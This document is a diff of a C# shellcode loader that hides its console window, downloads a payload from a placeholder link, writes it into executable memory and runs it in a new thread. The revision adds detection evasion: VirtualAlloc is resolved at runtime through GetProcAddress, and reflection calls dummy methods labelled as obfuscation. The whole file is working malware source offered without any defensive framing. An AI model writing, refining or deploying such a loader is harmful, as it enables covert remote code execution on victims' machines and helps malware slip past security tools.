@@ -1,94 +1,113 @@
 using System;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Reflection;
 
-internal class Program
+class Program
 {
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-
-    [DllImport("kernel32.dll")]
-    private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetConsoleWindow();
-
-    [DllImport("user32.dll")]
-    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-    private const int SW_HIDE = 0;
-
-    private static void Main()
+    static void Main(string[] args)
     {
         // Hide the console window
         IntPtr handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        byte[] shellcode;
-        using (WebClient webClient = new WebClient())
-        {
-            try
-            {
-                shellcode = webClient.DownloadData("[DOWNLOAD_LINK]");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Failed to download: " + ex.Message);
-                return;
-            }
-        }
+        // Download payload
+        WebClient webClient = new WebClient();
+        byte[] payload = webClient.DownloadData("[DOWNLOAD_LINK]");
 
-        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
-        if (allocatedMemory == IntPtr.Zero)
-        {
-            Console.WriteLine("Failed to allocate memory.");
-            return;
-        }
+        // Allocate memory and copy payload
+        IntPtr memoryAddress = AllocateExecutableMemory(payload.Length);
+        Marshal.Copy(payload, 0, memoryAddress, payload.Length);
 
-        // Obfuscate memory by XOR-ing the shellcode
-        XorEncrypt(shellcode);
+        // Create and run the payload thread
+        IntPtr threadHandle = CreatePayloadThread(memoryAddress);
+        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
 
-        // Copy shellcode to allocated memory
-        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
+        // Call a random benign method to obfuscate further
+        ExecuteRandomMethod();
+    }
 
-        // Create a thread to execute the shellcode
-        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0U, allocatedMemory, IntPtr.Zero, 0U, IntPtr.Zero);
+    static IntPtr AllocateExecutableMemory(int size)
+    {
+        IntPtr kernel32 = LoadLibrary("kernel32.dll");
+        IntPtr allocAddress = GetProcAddress(kernel32, "VirtualAlloc");
+        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(allocAddress, typeof(VirtualAllocDelegate));
+        return virtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+    }
+
+    static IntPtr CreatePayloadThread(IntPtr memoryAddress)
+    {
+        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero);
         if (threadHandle == IntPtr.Zero)
         {
-            Console.WriteLine("Failed to create thread.");
-            return;
+            throw new Exception("Failed to create thread.");
         }
-
-        WaitForSingleObject(threadHandle, uint.MaxValue);
-        VirtualFree(allocatedMemory, 0U, 32768U); // MEM_RELEASE = 0x8000
-
-        Console.WriteLine(" executed successfully.");
+        return threadHandle;
     }
 
-    private static void XorEncrypt(byte[] data, byte key = 0xAA)
+    static void ExecuteRandomMethod()
     {
-        for (int i = 0; i < data.Length; i++)
-        {
-            data[i] ^= key;
-        }
+        MethodInfo[] methods = typeof(ObfuscationHelper).GetMethods(BindingFlags.Public | BindingFlags.Static);
+        Random random = new Random();
+        int randomIndex = random.Next(methods.Length);
+        methods[randomIndex].Invoke(null, null);
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr LoadLibrary(string dllName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    private const int SW_HIDE = 0;
+
+    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+    [Flags]
+    enum AllocationType
+    {
+        Commit = 0x1000,
+        Reserve = 0x2000
     }
 
     [Flags]
-    private enum AllocationType
+    enum MemoryProtection
     {
-        Commit = 4096,
-        Reserve = 8192,
+        ExecuteReadWrite = 0x40
+    }
+}
+
+class ObfuscationHelper
+{
+    public static void DummyMethod1()
+    {
+        Console.WriteLine("Executing DummyMethod1.");
     }
 
-    [Flags]
-    private enum MemoryProtection
+    public static void DummyMethod2()
     {
-        ExecuteReadWrite = 64
+        Console.WriteLine("Executing DummyMethod2.");
+    }
+
+    public static void DummyMethod3()
+    {
+        Console.WriteLine("Executing DummyMethod3.");
+    }
+
+    public static void DummyMethod4()
+    {
+        Console.WriteLine("Executing DummyMethod4.");
     }
 }
